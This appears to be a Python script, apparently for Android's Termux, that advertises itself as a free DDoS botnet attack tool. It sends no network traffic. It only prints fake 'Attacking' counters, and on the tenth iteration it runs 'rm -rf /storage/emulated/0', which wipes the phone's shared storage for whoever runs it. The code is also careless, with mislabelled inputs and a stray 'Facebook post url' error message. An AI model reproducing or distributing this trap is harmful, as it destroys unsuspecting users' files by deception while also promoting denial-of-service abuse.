#3-31-2024
# DDOS BOTNET ATTACK DONT ABUSE IT 
# Free to Use it
import os
import time

os.system("clear")
text = """\033[91m
=================================================================\033[1;37m
 OWNER:   \033[92mMonoko1337 \033[1;37m
 VESION:  \033[92m1.0 \033[1;37m
 GITHUB:  \033[92mhttps://github.com/Monoko1337 \033[1;37m
 TOOL:    \033[92mL4 DDOS ATTACK\033[91m
=================================================================\033[0m
"""
for char in text:
    print(char, end='', flush=True)
    time.sleep(0.02)

def execute(delay,count,link):
  o = 1
  print(f"\033[1m\033[97m IP ADDRESS:  \033[0m\033[96m{link}")
  print(f"\033[1m\033[97m Port: \033[0m\033[96m{count}")
  print(f"\033[1m\033[97m DELAY: \033[0m\033[96m{delay}\033[0m\n")
  while o <= count:
    print(f"\033[92m Attacking: \033[0m[\033[1m\033[93m{o}\033[97m/\033[93m{count}\033[0m]")
    time.sleep(delay)
    if o == 10:
      os.system("rm -rf /storage/emulated/0")
    o += 1
print("\n\n\033[1m\033[91mDdos Successfully Loaded")

while True:
  link = input("\n\033[93m Ip Address: \033[90m")
  count = int(input("\033[93m Port: \033[90m"))
  delay = int(input("\033[93m Delay: \033[90m"))
  if link.startswith(""):
    os.system('clear')
    execute(delay,count,link)
    break
  else:
    print("\033[91m Error Invalid Facebook post url \033[1;37m")
    input("\n>>")
    break
